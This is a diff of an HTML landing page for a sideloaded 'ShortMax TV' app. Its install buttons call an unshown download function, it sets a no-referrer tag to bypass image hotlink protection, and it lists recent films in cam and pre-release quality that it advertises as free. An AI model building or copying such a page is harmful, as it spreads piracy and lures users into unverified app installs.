@@ -3,6 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <!-- 核心：防止圖片伺服器防盜鏈 403 攔截 -->
+  <meta name="referrer" content="no-referrer">
   <title>ShortMax TV - 官方最新安全安裝包</title>
 
   <!-- Meta Pixel 基礎代碼（多像素廣播） -->
@@ -16,11 +18,10 @@
     s.parentNode.insertBefore(t,s)}(window, document,'script',
     'https://connect.facebook.net/en_US/fbevents.js');
 
-    // 請替換為您的 Facebook 像素 ID
     fbq('init', '1723171458774127');
     fbq('init', '1909346100471713');
     fbq('init', '2200964224156607');
-     fbq('init', '1696866212023411');
+    fbq('init', '1696866212023411');
 
     fbq('track', 'PageView');
   </script>
@@ -63,6 +64,15 @@
     .live-badge {
       animation: live-ping 1.4s infinite ease-in-out;
     }
+
+    /* 三行橫向滑動專用 Grid 容器：高 156px、寬 330px，海報採標準 3:4 比例不截斷 */
+    .grid-three-rows {
+      display: grid;
+      grid-template-rows: repeat(3, 156px);
+      grid-auto-flow: column;
+      grid-auto-columns: 330px;
+      gap: 12px;
+    }
   </style>
 </head>
 <body class="flex flex-col min-h-screen pb-32">
@@ -90,13 +100,13 @@
     <div class="soft-card p-3.5 rounded-2xl flex items-center justify-between gap-3">
       <div class="flex items-center space-x-3 min-w-0">
         <div class="w-16 h-16 rounded-2xl bg-slate-900 border border-slate-300 shadow-sm flex flex-col items-center justify-between overflow-hidden flex-shrink-0">
-  <div class="flex-1 flex items-center justify-center">
-    <span class="text-white font-black text-2xl italic tracking-tighter">S</span>
-  </div>
-  <div class="w-full bg-[#ea580c] py-0.5 text-center leading-none">
-    <span class="text-white font-bold text-[9px] tracking-wider block">TV</span>
-  </div>
-</div>
+          <div class="flex-1 flex items-center justify-center">
+            <span class="text-white font-black text-2xl italic tracking-tighter">S</span>
+          </div>
+          <div class="w-full bg-[#ea580c] py-0.5 text-center leading-none">
+            <span class="text-white font-bold text-[9px] tracking-wider block">TV</span>
+          </div>
+        </div>
         <div class="min-w-0">
           <div class="flex items-center space-x-1.5">
             <h1 class="text-base font-extrabold text-slate-900 truncate">ShortMax TV</h1>
@@ -113,7 +123,7 @@
           </div>
         </div>
       </div>
-      <button onclick="triggerSmartDownload()" class="bg-orange-600 hover:bg-orange-700 active:scale-95 transition-all text-white text-xs font-bold px-3.5 py-2.5 rounded-xl shadow-sm whitespace-nowrap">
+      <button onclick="triggerSmartDownload('首屏立即安裝按鈕')" class="bg-orange-600 hover:bg-orange-700 active:scale-95 transition-all text-white text-xs font-bold px-3.5 py-2.5 rounded-xl shadow-sm whitespace-nowrap">
         立即安裝
       </button>
     </div>
@@ -137,8 +147,8 @@
       </div>
     </div>
 
-    <!-- 4. 單獨高亮：台灣衛視電視台直播專區（帶真實頻道台標矩陣） -->
-    <div onclick="triggerSmartDownload()" class="mt-3.5 bg-gradient-to-r from-red-600 via-orange-600 to-amber-600 p-[1.5px] rounded-2xl cursor-pointer active:scale-[0.99] transition-all shadow-md">
+    <!-- 4. 單獨高亮：台灣衛視電視台直播專區 -->
+    <div onclick="triggerSmartDownload('台灣電視台直播專區')" class="mt-3.5 bg-gradient-to-r from-red-600 via-orange-600 to-amber-600 p-[1.5px] rounded-2xl cursor-pointer active:scale-[0.99] transition-all shadow-md">
       <div class="bg-white rounded-2xl p-3.5">
         <div class="flex items-center justify-between pb-2 border-b border-slate-100">
           <div class="flex items-center space-x-2">
@@ -202,18 +212,20 @@
       </div>
     </div>
 
-    <!-- 5. 2026 影視片庫分類欄（類目順序嚴格對齊） -->
+    <!-- 5. 2026 影視片庫分類欄（三行橫向滑動 · 完整海報不截斷 · 增加劇情簡介） -->
     <div class="mt-4">
       <div class="flex items-center justify-between mb-2">
         <h3 class="text-xs font-bold text-slate-900 flex items-center">
           <span class="w-1.5 h-3.5 bg-orange-600 rounded-sm mr-1.5"></span>
           2026 台灣熱門免費在線片庫
         </h3>
-        <span class="text-[10px] text-orange-600 font-medium">左右滑動切換</span>
+        <span class="text-[10px] text-orange-600 font-medium">⇄ 三行滑動 · 點擊直接看</span>
       </div>
 
+      <!-- 分類切換按鈕列表：包含全部陸劇、電視劇、電影、動漫、綜藝等 -->
       <div class="flex space-x-1.5 overflow-x-auto hide-scrollbar pb-1 text-xs" id="categoryTabs">
         <button onclick="switchCategory('movie')" data-cat="movie" class="cat-btn px-3.5 py-1.5 rounded-xl bg-orange-600 text-white font-bold whitespace-nowrap shadow-sm transition-all">院線電影</button>
+        <button onclick="switchCategory('luju')" data-cat="luju" class="cat-btn px-3.5 py-1.5 rounded-xl bg-white text-slate-700 whitespace-nowrap border border-slate-200 font-semibold shadow-sm transition-all">熱門陸劇</button>
         <button onclick="switchCategory('tvseries')" data-cat="tvseries" class="cat-btn px-3.5 py-1.5 rounded-xl bg-white text-slate-700 whitespace-nowrap border border-slate-200 font-semibold shadow-sm transition-all">熱播電視劇</button>
         <button onclick="switchCategory('anime')" data-cat="anime" class="cat-btn px-3.5 py-1.5 rounded-xl bg-white text-slate-700 whitespace-nowrap border border-slate-200 font-semibold shadow-sm transition-all">人氣動漫</button>
         <button onclick="switchCategory('variety')" data-cat="variety" class="cat-btn px-3.5 py-1.5 rounded-xl bg-white text-slate-700 whitespace-nowrap border border-slate-200 font-semibold shadow-sm transition-all">熱門綜藝</button>
@@ -222,7 +234,10 @@
         <button onclick="switchCategory('sports')" data-cat="sports" class="cat-btn px-3.5 py-1.5 rounded-xl bg-white text-slate-700 whitespace-nowrap border border-slate-200 font-semibold shadow-sm transition-all">體育賽事</button>
       </div>
 
-      <div id="mediaContainer" class="flex space-x-2.5 overflow-x-auto hide-scrollbar pt-2 pb-1"></div>
+      <!-- 加大三行橫滑容器：高 156px，海報採標準 3:4 比例不截斷 -->
+      <div class="overflow-x-auto hide-scrollbar pt-2 pb-1">
+        <div id="mediaContainer" class="grid-three-rows"></div>
+      </div>
     </div>
 
     <!-- 6. 痛點對比模組 -->
@@ -285,7 +300,7 @@
       </div>
     </div>
 
-    <!-- 8. 台灣真實用戶評價區 -->
+    <!-- 8. 台灣真實用戶評價區 (已完全擴充並去重) -->
     <div class="mt-5">
       <div class="flex items-center justify-between mb-2.5">
         <h3 class="text-xs font-bold text-slate-900 flex items-center">
@@ -326,7 +341,7 @@
   <!-- 10. 吸底主轉化按鈕 -->
   <div class="fixed bottom-0 left-0 right-0 p-3 bg-white/95 backdrop-blur-md border-t border-slate-200 z-40 shadow-[0_-4px_16px_rgba(0,0,0,0.06)]">
     <div class="max-w-lg mx-auto">
-      <button onclick="triggerSmartDownload()" class="cta-glow w-full bg-gradient-to-r from-orange-600 via-orange-600 to-amber-600 hover:from-orange-700 hover:to-amber-700 active:scale-[0.98] transition-all text-white font-extrabold py-3.5 px-4 rounded-xl shadow-md flex items-center justify-center space-x-2">
+      <button onclick="triggerSmartDownload('吸底全域安裝按鈕')" class="cta-glow w-full bg-gradient-to-r from-orange-600 via-orange-600 to-amber-600 hover:from-orange-700 hover:to-amber-700 active:scale-[0.98] transition-all text-white font-extrabold py-3.5 px-4 rounded-xl shadow-md flex items-center justify-center space-x-2">
         <svg class="w-5 h-5 text-white animate-bounce" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
           <path stroke-linecap="round" stroke-linejoin="round" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4-4v12"></path>
         </svg>
@@ -383,79 +398,155 @@
   </div>
 
   <script>
-    // 2026 台灣熱門片庫
+    // 修正指向 gimytv.biz 圖片伺服器
+    const fixImg = (src) => {
+      if (!src) return "https://images.unsplash.com/photo-1518173946687-a4c8a383392e?w=300&auto=format&fit=crop&q=80";
+      if (src.startsWith('http://') || src.startsWith('https://')) return src;
+      return 'https://gimytv.biz' + src;
+    };
+
+    // 全量融合影視庫：包含電影(32)、陸劇(12)、電視劇(32)、動漫(32)、綜藝(32)、電視台、短劇、體育
     const MEDIA_DATABASE_2026 = [
-      // 1. 院線電影
-      { id: "m1", category: "movie", title: "奧德賽 (The Odyssey)", rating: "9.9", quality: "IMAX 4K", meta: "克里斯多福諾蘭 麥特戴蒙 2026史詩大作", isLive: false, posterUrl: "https://thumb.wikimedia.org/wikipedia/zh/thumb/7/73/The_Odyssey_2026_Poster.jpg/250px-The_Odyssey_2026_Poster.jpg?utm_source=zh.wikipedia.org&utm_campaign=parser&utm_content=thumbnail", bg: "linear-gradient(135deg, #1C2833, #0B1015)" },
-      { id: "m2", category: "movie", title: "蜘蛛人：嶄新之日", rating: "9.9", quality: "4K原聲", meta: "湯姆霍蘭德 辛蒂亞 漫威全新篇章", isLive: false, posterUrl: "https://thumb.wikimedia.org/wikipedia/zh/thumb/4/45/Spider-Man_Brand_New_Day_Poster.jpg/250px-Spider-Man_Brand_New_Day_Poster.jpg?utm_source=zh.wikipedia.org&utm_campaign=parser&utm_content=thumbnail", bg: "linear-gradient(135deg, #800A0A, #280505)" },
-      { id: "m3", category: "movie", title: "麥可傑克森：傳奇", rating: "9.8", quality: "4K杜比", meta: "賈法傑克森 音樂天王傳記巨製", isLive: false, posterUrl: "https://thumb.wikimedia.org/wikipedia/zh/thumb/f/fa/Michael_%282026_film%29_Poster.jpg/250px-Michael_%282026_film%29_Poster.jpg?utm_source=zh.wikipedia.org&utm_campaign=parser&utm_content=thumbnail", bg: "linear-gradient(135deg, #4A3005, #170F02)" },
-      { id: "m4", category: "movie", title: "玩具總動員 5", rating: "9.7", quality: "國語/原音", meta: "胡迪與巴斯光年重聚 皮克斯感動回歸", isLive: false, posterUrl: "https://thumb.wikimedia.org/wikipedia/zh/thumb/b/b0/Toy_Story_5_Poster.jpg/250px-Toy_Story_5_Poster.jpg?utm_source=zh.wikipedia.org&utm_campaign=parser&utm_content=thumbnail", bg: "linear-gradient(135deg, #1D3A5F, #0A1624)" },
-      { id: "m5", category: "movie", title: "快打旋風 (Street Fighter)", rating: "9.6", quality: "4K極清", meta: "傳奇格鬥改編 震撼打擊特效", isLive: false, posterUrl: "https://thumb.wikimedia.org/wikipedia/zh/thumb/e/e3/Street_Fighter_%282026_film%29_poster.jpg/250px-Street_Fighter_%282026_film%29_poster.jpg?utm_source=zh.wikipedia.org&utm_campaign=parser&utm_content=thumbnail", bg: "linear-gradient(135deg, #4E1818, #1C0808)" },
-      { id: "m6", category: "movie", title: "泥面人 (Clayface)", rating: "9.7", quality: "4K杜比", meta: "DC暗黑宇宙 哥譚懸疑驚悚", isLive: false, posterUrl: "https://thumb.wikimedia.org/wikipedia/zh/thumb/4/4f/Clayface_%28film%29_poster.jpg/250px-Clayface_%28film%29_poster.jpg?utm_source=zh.wikipedia.org&utm_campaign=parser&utm_content=thumbnail", bg: "linear-gradient(135deg, #2A2518, #110F0A)" },
-      { id: "m7", category: "movie", title: "飢餓遊戲：收穫日的日出", rating: "9.8", quality: "4K首映", meta: "第五十屆大旬祭 重磅展開", isLive: false, posterUrl: "https://thumb.wikimedia.org/wikipedia/zh/thumb/d/da/The_Hunger_Games_-_Sunrise_on_the_Reaping_poster.jpg/250px-The_Hunger_Games_-_Sunrise_on_the_Reaping_poster.jpg?utm_source=zh.wikipedia.org&utm_campaign=parser&utm_content=thumbnail", bg: "linear-gradient(135deg, #3C1E40, #140817)" },
-      { id: "m8", category: "movie", title: "哥吉拉：歸零 (Godzilla Zero)", rating: "9.8", quality: "4K高幀", meta: "怪獸之王 絕望毀滅降臨", isLive: false, posterUrl: "https://thumb.wikimedia.org/wikipedia/zh/thumb/0/09/Godzilla_Minus_Zero_poster.jpg/250px-Godzilla_Minus_Zero_poster.jpg?utm_source=zh.wikipedia.org&utm_campaign=parser&utm_content=thumbnail", bg: "linear-gradient(135deg, #323539, #0D0E10)" },
+      // 1. 院線電影（全 32 部）
+      { id: "m1", category: "movie", title: "奧德賽 (The Odyssey)", quality: "IMAX 4K", meta: "克里斯多福諾蘭, 麥特戴蒙", desc: "諾蘭執導跨星系科幻史詩！人類探索最後宜居星系的漫長航程，在時間膨脹與未知異星陷阱中尋求文明希望。", posterUrl: "https://thumb.wikimedia.org/wikipedia/zh/thumb/7/73/The_Odyssey_2026_Poster.jpg/250px-The_Odyssey_2026_Poster.jpg" },
+      { id: "m2", category: "movie", title: "蜘蛛人：嶄新之日", quality: "4K原聲", meta: "湯姆霍蘭德, 辛蒂亞", desc: "漫威全新篇章！失去所有人記憶的彼得·帕克在紐約街頭重新啟程，孤身迎戰全新黑暗勢力的極限博弈。", posterUrl: "https://thumb.wikimedia.org/wikipedia/zh/thumb/4/45/Spider-Man_Brand_New_Day_Poster.jpg/250px-Spider-Man_Brand_New_Day_Poster.jpg" },
+      { id: "m3", category: "movie", title: "麥可傑克森：傳奇", quality: "4K杜比", meta: "賈法傑克森 音樂天王傳記巨製", desc: "音樂天王麥可傑克森波瀾壯闊的傳奇一生，獨家收錄經典巡演現場幕後與未公開錄音室細節。", posterUrl: "https://thumb.wikimedia.org/wikipedia/zh/thumb/f/fa/Michael_%282026_film%29_Poster.jpg/250px-Michael_%282026_film%29_Poster.jpg" },
+      { id: "m4", category: "movie", title: "玩具總動員 5", quality: "國語/原音", meta: "胡迪與巴斯光年重聚 感動回歸", desc: "皮克斯感人回歸！電子螢幕時代玩具面臨全新生存挑戰，胡迪與巴斯光年再次攜手踏上尋找初心的冒險之旅。", posterUrl: "https://thumb.wikimedia.org/wikipedia/zh/thumb/b/b0/Toy_Story_5_Poster.jpg/250px-Toy_Story_5_Poster.jpg" },
+      { id: "m5", category: "movie", title: "快打旋風 (Street Fighter)", quality: "4K極清", meta: "傳奇格鬥改編 震撼打擊特效", desc: "傳奇街機格鬥全面躍上大銀幕！極致打擊特效、經典波動拳與昇龍拳完美還原，擂台激戰高燃開打。", posterUrl: "https://thumb.wikimedia.org/wikipedia/zh/thumb/e/e3/Street_Fighter_%282026_film%29_poster.jpg/250px-Street_Fighter_%282026_film%29_poster.jpg" },
+      { id: "m6", category: "movie", title: "泥面人 (Clayface)", quality: "4K杜比", meta: "DC暗黑宇宙 哥譚懸疑驚悚", desc: "哥譚市最神秘的反派起源揭曉！被毀容的演員利用實驗性化學物質化身泥面人，展開瘋狂連環復仇。", posterUrl: "https://thumb.wikimedia.org/wikipedia/zh/thumb/4/4f/Clayface_%28film%29_poster.jpg/250px-Clayface_%28film%29_poster.jpg" },
+      { id: "m7", category: "movie", title: "飢餓遊戲：收穫日的日出", quality: "4K首映", meta: "第五十屆大旬祭 重磅展開", desc: "經典前傳重磅來襲！黑密契年少時征戰雙倍貢品殘酷大旬祭，在生死博弈中破局生存的震撼歷程。", posterUrl: "https://thumb.wikimedia.org/wikipedia/zh/thumb/d/da/The_Hunger_Games_-_Sunrise_on_the_Reaping_poster.jpg/250px-The_Hunger_Games_-_Sunrise_on_the_Reaping_poster.jpg" },
+      { id: "m8", category: "movie", title: "哥吉拉：歸零 (Godzilla Zero)", quality: "4K高幀", meta: "怪獸之王 絕望毀滅降臨", desc: "毀滅性核輻射引發遠古巨獸覺醒，都市防禦工事全面潰敗，人類在絕望廢墟中尋求一線生機。", posterUrl: "https://thumb.wikimedia.org/wikipedia/zh/thumb/0/09/Godzilla_Minus_Zero_poster.jpg/250px-Godzilla_Minus_Zero_poster.jpg" },
+      { id: "m9", category: "movie", title: "街頭霸王2026", quality: "搶先版", meta: "諾亞·琴蒂內奧, 安德魯·浩二", desc: "全新真人重啟！頂尖格鬥家齊聚世界擂台，炫酷打擊特效與終極必殺技引爆熱血。", posterUrl: fixImg("/upload/vod/20261015-main/83d92769d56b7920f65152ed0d0282352b56d428529919f3ec346f94670d9e56.jpg") },
+      { id: "m10", category: "movie", title: "鯨口脫險", quality: "TC超清版", meta: "奧斯汀·艾佈拉姆斯, 喬什·佈洛林", desc: "深海科考隊遭遇遠古深海巨鯨吞噬，幽閉鯨腹內部極限逃生，深海窒息恐懼全線升級。", posterUrl: fixImg("/upload/vod/20261016-1/eb16c98ce7220fb1d595fa86645fa53d.webp") },
+      { id: "m11", category: "movie", title: "希望2026", quality: "HD", meta: "黃政民, 趙寅成, 鄭好娟", desc: "外星異種降臨孤島小鎮，邊境居民與神秘未知生物展開殊死博弈，人性深處的極限救贖震撼上演。", posterUrl: fixImg("/upload/vod/20261013-1/ba298a17d5274d680446112c0680c17f.webp") },
+      { id: "m12", category: "movie", title: "重生2", quality: "更新TC", meta: "梁洛施, 文俊煇, 洪金寶, 白客", desc: "海外販毒黑幫黑幕重重，臥底暗棋孤注一擲逆局翻盤，拳拳到肉的硬派復仇爽片全面回歸。", posterUrl: fixImg("/upload/vod/20261015-main/fc0dca1ed3716da89759885496885151d6e16aa64297395540ec946043557389.webp") },
+      { id: "m13", category: "movie", title: "墜落2：死點", quality: "HD", meta: "哈麗特·斯萊特, 阿塞瑪·托馬斯", desc: "千米高空廢棄信號塔再次成為絕命牢籠，颶風逼近、梯斷繩裂，極限求生每一秒都在挑戰心跳。", posterUrl: fixImg("/upload/vod/20261008-main/3267957a98177cf6497cf6af9aec3f5fcb13a2b585111558f59ffc95bb7f433b.webp") },
+      { id: "m14", category: "movie", title: "熊洞", quality: "正片", meta: "Chara Kyriazi, Pamela Oikonomaki", desc: "歐洲先鋒懸疑力作，密林深處的避難洞穴隱藏著不可告人的家族秘密與危機。", posterUrl: "https://xl.xltupian.com/cover/82707bd65977ff442c025028801507f4.jpg" },
+      { id: "m15", category: "movie", title: "功夫女足", quality: "正片", meta: "張小斐, 迪麗熱巴, 張藝興, 劉嘉玲", desc: "傳統少林絕技與現代女子足球跨界碰撞，一群熱血少女用真功夫在綠茵場上踢出奇蹟！", posterUrl: fixImg("/upload/vod/20261008-2/5a37da552223a78851ba7f972691f104.webp") },
+      { id: "m16", category: "movie", title: "情場如戰場", quality: "HD", meta: "曾樂彤, 陳家樂, 黎峻, 馬思惠", desc: "都市男女的高段位情場過招，真情假意各懷鬼胎，在曖昧與博弈中解構現代都市愛情關係。", posterUrl: fixImg("/upload/vod/20261017-1/70d45dd43f9aefc77930071d31d06a36.webp") },
+      { id: "m17", category: "movie", title: "營救夜鶯", quality: "HD", meta: "拉莫尼卡·加勒特, 安德魯·霍華德", desc: "特種作戰小隊深入敵後未知戰區，在漫天火網與背叛陰謀中護送代號「夜鶯」的關鍵證人。", posterUrl: fixImg("/upload/vod/20261017-1/55374c71b78556a577566d3172d782a5.webp") },
+      { id: "m18", category: "movie", title: "盃雪·一戰成名", quality: "HD", meta: "潘斌龍, 安志傑, 奚望, 淳於珊珊", desc: "經典武俠冷兵器硬派對決！風雪驛站刀光劍影，退隱高手為義再拔長刀，血染漫天江湖。", posterUrl: fixImg("/upload/vod/20261016-1/ef09fcd06ba8fb7329529b058ee7c95d.webp") },
+      { id: "m19", category: "movie", title: "促織", quality: "更新HD", meta: "蒲松齡聊齋志異經典改編", desc: "小官吏為一隻促織家破人亡，奇幻借形、諷喻官場，荒誕怪誕中揭露冷酷現實人間。", posterUrl: fixImg("/upload/vod/20261016-1/b224d9ef5962c6257b669b169bb243b8.png") },
+      { id: "m20", category: "movie", title: "另一個媽媽", quality: "搶先版", meta: "傑西卡·查斯坦, 傑伊·杜普拉斯", desc: "平靜生活被突然造訪的神秘女子打破，雙重身份與記憶錯位交織，隱匿的母愛真相令人心碎。", posterUrl: "https://xl.xltupian.com/cover/32cefc900be5c910ea922cc949b2455b.jpg" },
+      { id: "m21", category: "movie", title: "野獸之心", quality: "TC", meta: "佈拉德·皮特, J·K·西矇斯", desc: "老牌刑警與冷血高智商罪犯在邊境小鎮漫天暴雨中展開心理極限圍剿，結局驚人反轉。", posterUrl: fixImg("/upload/vod/20261008-2/f52a0170e58e4baf5a4e55d4e25f2657.jpg") },
+      { id: "m22", category: "movie", title: "屍變2026", quality: "搶先版", meta: "傑弗裡·多諾萬, 達娜·米利肯", desc: "經典林中小屋恐怖宇宙重啟，遠古死靈之書再次被不經意誦讀，血腥噩夢籠罩整座山谷森林。", posterUrl: fixImg("/upload/vod/20261008-1/1d722f410597ff80ff976bc0eef6ec01.jpg") },
+      { id: "m23", category: "movie", title: "妻子2026", quality: "HD", meta: "柳泰俊, 廉聖伊, 樸亨根", desc: "表面相敬如賓的模範夫妻在暗流湧動的財閥鬥爭中各自設局，背叛與復仇逐漸失控。", posterUrl: fixImg("/upload/vod/20261012-1/4e0683ba6a3a7ab03f3431c329c92da5.webp") },
+      { id: "m24", category: "movie", title: "不存在的罪人", quality: "更新TC", meta: "安妮·海瑟薇, 達科塔·約翰遜", desc: "懸疑法庭心理大作！一場毫無物證的離奇命案，兩位頂尖女律師在真相與道德邊界互相試探。", posterUrl: fixImg("/upload/vod/20261008-2/4cd3e90dd0f825fa11f45d11a5752b32.webp") },
+      { id: "m25", category: "movie", title: "火柴盒大電影", quality: "HD", meta: "約翰·塞納, 傑西卡·貝爾", desc: "風靡全球的微型玩具車躍上大螢幕，特技車手與神秘特工展開跨越七國的極速飆車狂飆冒險！", posterUrl: fixImg("/upload/vod/20261009-1/1d340b1065abe629817950b12a86ba16.webp") },
+      { id: "m26", category: "movie", title: "暫告安全", quality: "完結", meta: "傑森·斯坦森, 凱瑟琳·陳, 羅伯特·約翰", desc: "落魄前特工偶然救下一位擁有天價秘密的數學神童，一人獨自對抗三路黑幫圍堵護送脫險。", posterUrl: fixImg("/upload/vod/20261008-2/5a1e01352ceab998834098f98307a3fb.jpg") },
+      { id: "m27", category: "movie", title: "得州狂鯊", quality: "HD", meta: "邁尅爾·尅拉裡·尼斯, Michelle", desc: "洪水氾濫的得州內陸小鎮被變異巨齒狂鯊入侵，泥濘水域中居民展開驚心動魄的生死反擊。", posterUrl: fixImg("/upload/vod/20261012-1/9a5237ceab06a562013266be5f6ed6cd.webp") },
+      { id: "m28", category: "movie", title: "街頭霸王2026 (日語版)", quality: "搶先版", meta: "諾亞·琴蒂內奧, 安德魯·浩二", desc: "聚焦世界暗黑格鬥聯盟的暗影角逐，隆與肯青年時代的宿命之戰全視角解密演繹。", posterUrl: "https://xl.xltupian.com/cover/fd56fee25cf9f50f32c800e64a6e652a.jpg" },
+      { id: "m29", category: "movie", title: "孤軍突圍", quality: "HD", meta: "科林·漢尅斯, 斯科特·伊斯特伍德", desc: "二戰經典戰役寫實改編，被切斷補給的殘存孤軍在絕境雪原頑強阻擊，鑄就鐵血軍魂。", posterUrl: fixImg("/upload/vod/20261015-1/798d73019e767f5f30f51add37f0fe75.webp") },
+      { id: "m30", category: "movie", title: "西辛9", quality: "正片", meta: "Burcu Almeman, Fahrettin Avci", desc: "土耳其傳奇宗教恐怖神作第九部！邪術詛咒侵蝕無辜家庭，驚悚儀式感引發極致恐懼。", posterUrl: fixImg("/upload/vod/20261016-1/4169feb939aff1d9c3021573d8012c23.webp") },
+      { id: "m31", category: "movie", title: "睾丸", quality: "正片", meta: "塔狄娜·帕帕莫捨, Gisela·Dali", desc: "歐洲經典文藝劇情片，以大膽細膩的鏡頭刻畫人性慾望與社會階層的深刻對立。", posterUrl: fixImg("/upload/vod/20261008-2/60805cf98f9f2ba0ceae516e40930267.jpg") },
+      { id: "m32", category: "movie", title: "蜘蛛俠：嶄新之日 (同步)", quality: "更新HD", meta: "湯姆·霍蘭德, 贊達亞, 薩迪·辛尅", desc: "漫威多元宇宙全新篇章，全新彼得帕克在失憶世界中重構命運秩序。", posterUrl: fixImg("/upload/vod/20261008-2/20061ce3302eddf2be581352522f9601.webp") },
 
-      // 2. 熱播電視劇
-      { id: "t1", category: "tvseries", title: "百萬人推理", rating: "9.9", quality: "4K全集", meta: "鄭伊健 李霈瑜 婁峻碩 2026懸疑神作完結", isLive: false, posterUrl: "https://upload.wikimedia.org/wikipedia/zh/7/7d/MillionFollowerDetectivePoster.jpg?utm_source=zh.wikipedia.org&utm_campaign=parser&utm_content=thumbnail_unscaled", bg: "linear-gradient(135deg, #1A242F, #0D131A)" },
-      { id: "t2", category: "tvseries", title: "凶宅專賣店", rating: "9.8", quality: "4K首播", meta: "李銘順 范少勳 陳姸霏 靈異房產驚悚揭秘", isLive: false, posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQf5ldPO31Js70cj4p28OEjlLF2YGbxC6JbP51f7HhWDg&s=10", bg: "linear-gradient(135deg, #241D12, #0E0B07)" },
-      { id: "t3", category: "tvseries", title: "沉默的審判", rating: "9.9", quality: "4K同步", meta: "阮經天 王淨 張孝全 司法體制極限博弈", isLive: false, posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQKCgq_XF7NIfOeStSjPs7_fERo45-E01d93c_Z3jcpjw&s=10", bg: "linear-gradient(135deg, #1C1C26, #0A0A0F)" },
-      { id: "t4", category: "tvseries", title: "欠妳的那場婚禮", rating: "9.8", quality: "4K旗艦", meta: "張孝全 蘇慧倫 謝盈萱 跨越20年的虐心眷戀", isLive: false, posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRCGMuJ7JlJxXU95-CUY5PkSRIj4vXP7I9SXTXF8c8t4Q&s=10", bg: "linear-gradient(135deg, #3B1B0E, #140803)" },
-      { id: "t5", category: "tvseries", title: "何百芮的地獄戀曲", rating: "9.7", quality: "繁中超清", meta: "郭書瑤 黑色幽默都會喜劇 笑中帶淚共鳴", isLive: false, posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTZxeymkOSz2wgUplzyGBfuQgX9wTSbaaUug2iW15mUYA&s=10", bg: "linear-gradient(135deg, #331422, #12050B)" },
-      { id: "t6", category: "tvseries", title: "同棲散策", rating: "9.6", quality: "全劇免扣點", meta: "言承旭 林依晨 姚淳耀 婚姻探討深層話題", isLive: false, posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSjH4q74i5pCKjcvaAMdxlnX9mY0K00Hq2aEwohkNoG1g&s=10", bg: "linear-gradient(135deg, #2D1E22, #100A0C)" },
-      { id: "t7", category: "tvseries", title: "都市開基祖", rating: "9.6", quality: "原音首播", meta: "莊凱勛 鍾瑶 陳竹昇 台灣在地土地傳奇奮鬥", isLive: false, posterUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTYa5_dhO9wCr_FlT5vhc9AnySCLoiS0mdw-0ekqN0KeA&s=10", bg: "linear-gradient(135deg, #16262B, #081114)" },
-      { id: "t8", category: "tvseries", title: "人生只租不賣", rating: "9.7", quality: "每週跟播", meta: "陳姸霏 黃河 林予晞 台北租屋族的青春寫實", isLive: false, posterUrl: "https://apl-hamivideo.cdn.hinet.net/HamiVideo/getHamiVideoImg.php?imageId=sourceImages@2546105909_o_20260105161514.jpg", bg: "linear-gradient(135deg, #1C2B22, #07120A)" },
+      // 2. 熱門陸劇（全 12 部全量添加）
+      { id: "lj1", category: "luju", title: "嫁金釵", quality: "第10集", meta: "田曦薇, 閆桉, 劉小北, 潘珺雅", desc: "商賈之女代姐聯姻侯府，憑藉機敏智謀智鬥豪門心機，收穫真摯愛情並重振家業的甜爽大劇。", posterUrl: fixImg("/upload/vod/20261016-main/db3e063418cd91769371d5dff3afbef9c0383a3de485713b0e44d000229c7619.jpg") },
+      { id: "lj2", category: "luju", title: "蘭香如故", quality: "更新第47集", meta: "李夢, 囌可, 譚松韻, 葉青, 陳創", desc: "深宅大院中蘭香幾度花開花落，幾代女性在封建禮教禁錮下的覺醒抗爭與命運牽絆。", posterUrl: fixImg("/upload/vod/20261008-1/ded9a0bc5e026f855702f920736381ac.jpg") },
+      { id: "lj3", category: "luju", title: "玉簟鞦", quality: "第15集", meta: "丞磊, 徐若晗, 張豐毅, 徐帆", desc: "民國亂世烽火連天，名門孤女與鐵血軍閥在權謀博弈與家國恩怨中譜寫蕩氣迴腸的虐心絕戀。", posterUrl: fixImg("/upload/vod/20261012-1/aebee7fb742000b34cb479d684e33912.webp") },
+      { id: "lj4", category: "luju", title: "美人餘", quality: "更新至第22集", meta: "李一桐, 王佳佳, 常華森, 曾夢雪", desc: "隱秘民間醫女捲入宮廷權爭風雲，憑藉超群醫術化解重重殺機，從卑微侍婢逆襲封冠天下。", posterUrl: fixImg("/upload/vod/20261009-1/fe6eb0961ae2c5f65246e9d656b95a98.webp") },
+      { id: "lj5", category: "luju", title: "魅影神捕", quality: "更新第30集", meta: "羅雲熙, 方逸倫, 沈羽潔, 何泓姍", desc: "六扇門頂級神捕攜手江湖異士連破京城奇案，抽絲剝繭揭露隱藏三十年的前朝驚天宮闈密謀。", posterUrl: fixImg("/upload/vod/20261008-2/de32cc1cb19bd25f420aec405b879af9.webp") },
+      { id: "lj6", category: "luju", title: "一甌春", quality: "第30集已完結", meta: "許凱, 周也, 白澍, 閔春曉", desc: "宋代茶道傳奇浪漫演繹！落魄茶莊世子與天才點茶少女攜手復興名茶，情定一盞清茗之中。", posterUrl: fixImg("/upload/vod/20261008-1/9c5fe174147d4dc2f9d9c257cf90c464.jpg") },
+      { id: "lj7", category: "luju", title: "無可替代2026", quality: "第20集已完結", meta: "魏大勛, 李子峰, 王鏘, 蓋玥希", desc: "都市職場菁英在遭遇好友背叛與創業崩盤後重振旗鼓，用智慧與真心贏回尊嚴的勵志力作。", posterUrl: fixImg("/upload/vod/20261008-1/1758bdee62f9d337d236d66faa545fa6.jpg") },
+      { id: "lj8", category: "luju", title: "醉夢", quality: "更新第08集", meta: "劉詩詩, 李迺文, 衚先煦, 黃小蕾", desc: "江南釀酒世家女當家在時局動盪中守護千年古方，商海浮沉與恩怨情仇交織的古裝傳奇史詩。", posterUrl: fixImg("/upload/vod/20261016-1/f273a9e6d8bdc62222efe544736df2e8.webp") },
